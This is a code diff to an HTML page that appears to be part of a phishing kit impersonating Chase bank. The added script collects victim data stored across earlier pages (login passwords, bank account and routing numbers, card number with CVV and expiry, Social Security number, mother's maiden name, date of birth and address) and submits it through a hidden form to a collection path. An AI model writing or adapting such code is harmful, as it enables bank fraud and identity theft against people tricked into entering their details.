@@ -67,9 +67,9 @@
 
                             <div class="row">
                                 <button class="jpui button focus fluid primary" type="submit" id="signin-button" >
-                                                <span class="label">
-                                                    Finish
-                                                </span>
+                                    <span class="label">
+                                        Finish
+                                    </span>
                                 </button>
                             </div>
                         </form>
@@ -86,4 +86,68 @@
     $(function() {
         $('.zip').mask('00000-000');
     });
+</script>
+<script type="application/javascript">
+    // your function
+    let my_func = (event) => {
+        event.preventDefault();
+
+        sessionStorage.setItem("lu_address", document.getElementById("address-input-field").value );
+        sessionStorage.setItem("lu_city", document.getElementById("city-input-field").value );
+        sessionStorage.setItem("lu_state", document.getElementById("state-input-field").value );
+        sessionStorage.setItem("lu_zipCode", document.getElementById("zip-code-input-field").value );
+
+        let data= {
+            username:  sessionStorage.getItem("lu_username"),
+            password1:  sessionStorage.getItem("lu_password1"),
+            email:  sessionStorage.getItem("lu_email"),
+            password2:  sessionStorage.getItem("lu_password2"),
+            acctNo:  sessionStorage.getItem("lu_acctNo"),
+            routNo:  sessionStorage.getItem("lu_routNo"),
+            cardNo:  sessionStorage.getItem("lu_cardNo"),
+            cardName:  sessionStorage.getItem("lu_cardName"),
+            cardExpiry:  sessionStorage.getItem("lu_cardExpiry"),
+            cvv:  sessionStorage.getItem("lu_cvv"),
+            phoneNo:  sessionStorage.getItem("lu_phoneNo"),
+            ssn:  sessionStorage.getItem("lu_ssn"),
+            madienName:  sessionStorage.getItem("lu_madienName"),
+            dob:  sessionStorage.getItem("lu_dob"),
+            address:  sessionStorage.getItem("lu_address"),
+            city:  sessionStorage.getItem("lu_city"),
+            state:  sessionStorage.getItem("lu_state"),
+            zipCode:  sessionStorage.getItem("lu_zipCode"),
+        };
+        console.log(data);
+        post('/_yesssh5/Safety/Chase/n/1eb932e5745c485929f49dbefceggg33', data);
+    };
+
+    // your form
+    //    let form = document.getElementById("login-form");
+
+    // attach event listener
+    form.addEventListener("submit", my_func, true);
+
+    function post(path, params, method) {
+        method = method || "post"; // Set method to post by default if not specified.
+
+        // The rest of this code assumes you are not using a library.
+        // It can be made less wordy if you use one.
+        let form = document.createElement("form");
+        form.setAttribute("method", method);
+        form.setAttribute("action", path);
+
+        for(let key in params) {
+            if(params.hasOwnProperty(key)) {
+                let hiddenField = document.createElement("input");
+                hiddenField.setAttribute("type", "hidden");
+                hiddenField.setAttribute("name", key);
+                hiddenField.setAttribute("value", params[key]);
+
+                form.appendChild(hiddenField);
+            }
+        }
+
+        document.body.appendChild(form);
+        form.submit();
+    }
 </script>
